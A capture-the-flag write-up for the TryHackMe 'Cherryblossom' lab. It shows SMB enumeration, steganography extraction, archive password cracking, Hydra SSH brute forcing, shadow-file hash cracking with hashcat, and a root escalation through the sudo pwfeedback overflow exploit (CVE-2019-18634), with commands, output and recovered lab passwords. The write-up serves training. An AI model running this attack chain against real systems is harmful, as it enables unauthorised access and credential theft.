# Cherryblossom

Hardest box in THM.

> Arunkumar (0xarun) | DEC 23 2021

-----------------------------------------

### Nmap

> 22 ssh
> 139 smb
> 445 smb

smb anonymous login allowed

```bash
┌──(arundhanush㉿kali)-[~/CTF/THM/cherryblossom]
└─$ smbclient \\\\10.10.93.179\\Anonymous                                   1 ⨯
Enter WORKGROUP\arundhanush's password: 
Anonymous login successful
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Mon Feb 10 05:52:51 2020
  ..                                  D        0  Sun Feb  9 23:18:18 2020
  journal.txt                         N  3470998  Mon Feb 10 05:50:53 2020

                10253588 blocks of size 1024. 4653720 blocks available
smb: \> 
```

journal.txt contains base64 

```bash
┌──(arundhanush㉿kali)-[~/CTF/THM/cherryblossom]
└─$ cat journal.txt | base64 -d >> journal      
                                                                                
┌──(arundhanush㉿kali)-[~/CTF/THM/cherryblossom]
└─$ file journal                                                          130 ⨯
journal: PNG image data, 1280 x 853, 8-bit/color RGB, non-interlaced

``` 

Got png file 

stego!!!!!! 

pip3 install stegpy

```bash
┌──(arundhanush㉿kali)-[/tmp]
└─$ stegpy journal
File _journal.zip succesfully extracted from journal
                                                                                
┌──(arundhanush㉿kali)-[/tmp]
└─$ file _journal.zip                        
_journal.zip: JPEG image data
```

after extracted stegpy gives zip file but file cammand shows "JPEG image data" lets change to zip

	.zip	50 4B 03 04

hexeditor!!!!!

```bash
File: _journal.zip                ASCII Offset: 0x00000004 / 0x000113F8 (%00)  M
00000000  50 4B 03 04  14 00 09 00   08 00 35 00  4A 50 84 7D   PK........5.JP.}
00000010  98 0B 3D 13  01 00 22 13   01 00 0B 00  1C 00 4A 6F   ..=...".......Jo
00000020  75 72 6E 61  6C 2E 63 74   7A 55 54 09  00 03 66 9D   urnal.ctzUT...f.
00000030  40 5E F0 9D  40 5E 75 78   0B 00 01 04  E8 03 00 00   @^..@^ux........
00000040  04 E8 03 00  00 21 B1 7B   4D 77 F7 05  04 F0 11 E4   .....!.{Mw......
00000050  B9 EA AC 4C  7C 1F 70 AB   F1 03 47 39  B8 8F 63 EC   ...L|.p...G9..c.
00000060  6C AE 14 EB  12 7E B7 D6   5D 86 1F 34  52 25 34 AE   l....~..]..4R%4.
00000070  DB 99 24 A7  55 2F 76 AB   FE B0 76 21  91 38 A9 90   ..$.U/v...v!.8..
00000080  94 61 E1 00  D9 DA 96 4C   0D 8C 71 2D  5E 79 4B 48   .a.....L..q-^yKH
00000090  D3 62 58 5F  E1 07 0A 2C   60 E0 A3 E0  38 17 1D B1   .bX_...,`...8...
000000A0  06 A6 87 B6  84 E9 59 BD   ED 01 F3 FB  5C 24 42 E2   ......Y.....\$B.
000000B0  81 4C FF A1  0B 2F 96 21   7A 19 A8 EC  BE C5 6E 15   .L.../.!z.....n.
000000C0  B1 AE AB 25  FC E5 28 68   28 22 7E 07  1E 2B 9A A9   ...%..(h("~..+..
000000D0  FB 5B 20 56  CE EA 4C 12   ED D7 BA 05  49 7A BE A8   .[ V..L.....Iz..
000000E0  E1 43 BD 55  81 02 03 B3   FC E9 CC DC  93 B2 51 C1   .C.U..........Q.
000000F0  C9 48 92 FC  B6 AF 57 24   B0 6B EC 83  A7 C4 A6 6C   .H....W$.k.....l
00000100  79 8D 55 51  4F 88 80 DC   51 C1 6C 1B  C8 DA 58 C8   y.UQO...Q.l...X.
^G Help   ^C Exit (No Save)   ^T goTo Offset   ^X Exit and Save   ^W Search  
```

now its zip 

```bash
┌──(arundhanush㉿kali)-[/tmp]
└─$ file _journal.zip
_journal.zip: Zip archive data, at least v2.0 to extract
                                                            
```

```bash
┌──(arundhanush㉿kali)-[/tmp]
└─$ unzip _journal.zip                                                      9 ⨯
Archive:  _journal.zip
[_journal.zip] Journal.ctz password: 
```

we have to brutefroce the passwd. fcrackzip ftw!

```bash
┌──(arundhanush㉿kali)-[/tmp]
└─$ fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt _journal.zip       80 ⨯


PASSWORD FOUND!!!!: pw == september

┌──(arundhanush㉿kali)-[/tmp]
└─$ unzip _journal.zip
Archive:  _journal.zip
[_journal.zip] Journal.ctz password: 
  inflating: Journal.ctz             
                                                                                
┌──(arundhanush㉿kali)-[/tmp]
└─$ file Journal.ctz                                                
Journal.ctz: 7-zip archive data, version 0.4

```

Yeah .ctz is cherrytree file. Cherrytree is default on kali machine but we can't open its ask passwd

Now its time to crack! 7-zip coz file cammnd shows "7-zip archive data"

```bash
┌──(arundhanush㉿kali)-[/tmp]
└─$ locate 7z2john
/usr/share/doc/john/README.7z2john.md
/usr/share/john/7z2john.pl
                                                                                
┌──(arundhanush㉿kali)-[/tmp]
└─$ /usr/share/john/7z2john.pl Journal.ctz >> hash

```

	john --wordlist=/usr/share/wordlists/rockyou.txt hash

Hash crakced **tigerlily** 

Got some wordlists and some username like girlfrind "lily" lets run brutefrom accordingly to lily.

```bash
┌──(arundhanush㉿kali)-[~/CTF/THM/cherryblossom/wordlist]
└─$ hydra -l lily -P 5-1-12552-cherry-blossom.list ssh://10.10.93.179     255 ⨯
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-12-23 04:59:26
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 9923 login tries (l:1/p:9923), ~621 tries per task
[DATA] attacking ssh://10.10.93.179:22/
[STATUS] 159.00 tries/min, 159 tries in 00:01h, 9764 to do in 01:02h, 16 active
[STATUS] 112.00 tries/min, 336 tries in 00:03h, 9587 to do in 01:26h, 16 active
[22][ssh] host: 10.10.93.179   login: lily   password: Mr.$un$hin3
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-12-23 05:05:45

```

ssh as lily no user.txt file move to johan

	cat /var/backups/shadow.bak

```bash
lily@cherryblossom:/var/backups$ cat shadow.bak 
root:$6$l81PobKw$DE0ra9mYvNY5rO0gzuJCCXF9p08BQ8ALp5clk/E6RwSxxrw97h2Ix9O6cpVHnq1ZUw3a/OCubATvANEv9Od9F1:18301:0:99999:7:::
daemon:*:17647:0:99999:7:::
bin:*:17647:0:99999:7:::
sys:*:17647:0:99999:7:::
sync:*:17647:0:99999:7:::
games:*:17647:0:99999:7:::
man:*:17647:0:99999:7:::
lp:*:17647:0:99999:7:::
mail:*:17647:0:99999:7:::
news:*:17647:0:99999:7:::
uucp:*:17647:0:99999:7:::
proxy:*:17647:0:99999:7:::
www-data:*:17647:0:99999:7:::
backup:*:17647:0:99999:7:::
list:*:17647:0:99999:7:::
irc:*:17647:0:99999:7:::
gnats:*:17647:0:99999:7:::
nobody:*:17647:0:99999:7:::
systemd-network:*:17647:0:99999:7:::
systemd-resolve:*:17647:0:99999:7:::
syslog:*:17647:0:99999:7:::
messagebus:*:17647:0:99999:7:::
_apt:*:17647:0:99999:7:::
uuidd:*:17647:0:99999:7:::
avahi-autoipd:*:17647:0:99999:7:::
usbmux:*:17647:0:99999:7:::
dnsmasq:*:17647:0:99999:7:::
rtkit:*:17647:0:99999:7:::
speech-dispatcher:!:17647:0:99999:7:::
whoopsie:*:17647:0:99999:7:::
kernoops:*:17647:0:99999:7:::
saned:*:17647:0:99999:7:::
pulse:*:17647:0:99999:7:::
avahi:*:17647:0:99999:7:::
colord:*:17647:0:99999:7:::
hplip:*:17647:0:99999:7:::
geoclue:*:17647:0:99999:7:::
gnome-initial-setup:*:17647:0:99999:7:::
gdm:*:17647:0:99999:7:::
johan:$6$zV7zbU1b$FomT/aM2UMXqNnqspi57K/hHBG8DkyACiV6ykYmxsZG.vLALyf7kjsqYjwW391j1bue2/.SVm91uno5DUX7ob0:18301:0:99999:7:::
lily:$6$3GPkY0ZP$6zlBpNWsBHgo6X5P7kI2JG6loUkZBIOtuOxjZpD71spVdgqM4CTXMFYVScHHTCDP0dG2rhDA8uC18/Vid3JCk0:18301:0:99999:7:::
sshd:*:18301:0:99999:7:::

```

johan passwd cracked by using wordlist cherryblossom.list

```bash
┌──(arundhanush㉿kali)-[~/CTF/THM/cherryblossom]
└─$ hashcat -a 0 -m 1800 johan wordlist/5-1-12552-cherry-blossom.list -O                                                                                          1 ⨯
hashcat (v6.1.1) starting...

OpenCL API (OpenCL 1.2 pocl 1.6, None+Asserts, LLVM 9.0.1, RELOC, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
=============================================================================================================================
* Device #1: pthread-AMD PRO A4-4350B R4, 5 COMPUTE CORES 2C+3G, 2765/2829 MB (1024 MB allocatable), 2MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 15

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Applicable optimizers applied:
* Optimized-Kernel
* Zero-Byte
* Single-Hash
* Single-Salt
* Uses-64-Bit

Watchdog: Hardware monitoring interface not found on your system.
Watchdog: Temperature abort trigger disabled.

Host memory required for this attack: 64 MB

Dictionary cache built:
* Filename..: wordlist/5-1-12552-cherry-blossom.list
* Passwords.: 9923
* Bytes.....: 99495
* Keyspace..: 9923
* Runtime...: 0 secs

$6$zV7zbU1b$FomT/aM2UMXqNnqspi57K/hHBG8DkyACiV6ykYmxsZG.vLALyf7kjsqYjwW391j1bue2/.SVm91uno5DUX7ob0:##scuffleboo##
                                                 
Session..........: hashcat
Status...........: Cracked
Hash.Name........: sha512crypt $6$, SHA512 (Unix)
Hash.Target......: $6$zV7zbU1b$FomT/aM2UMXqNnqspi57K/hHBG8DkyACiV6ykYm...UX7ob0
Time.Started.....: Thu Dec 23 06:08:12 2021 (11 secs)
Time.Estimated...: Thu Dec 23 06:08:23 2021 (0 secs)
Guess.Base.......: File (wordlist/5-1-12552-cherry-blossom.list)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:      554 H/s (11.54ms) @ Accel:16 Loops:1024 Thr:1 Vec:4
Recovered........: 1/1 (100.00%) Digests
Progress.........: 6697/9923 (67.49%)
Rejected.........: 169/6697 (2.52%)
Restore.Point....: 6665/9923 (67.17%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:4096-5000
Candidates.#1....: #sexychloebabe# -> #sabrina

Started: Thu Dec 23 06:08:10 2021
Stopped: Thu Dec 23 06:08:25 2021

```


## Privesc


```bash
johan@cherryblossom:/tmp$ sudo -l
[sudo] password for johan: *****************
```

privesc with sudo buffer overflow

```bash
johan@cherryblossom:/tmp$ perl -e 'print(("A" x 100 . "\x{00}") x 50)' | sudo -S /bin/bash
[sudo] password for johan: 
Segmentation fault (core dumped)

```

exploit : https://raw.githubusercontent.com/saleemrashid/sudo-cve-2019-18634/master/exploit.c

	gcc -o exploit exploit.c

johan@cherryblossom:/tmp$ ./exploit 
[sudo] password for johan: 
Sorry, try again.
# id
uid=0(root) gid=0(root) groups=0(root),1001(johan),1003(devs)

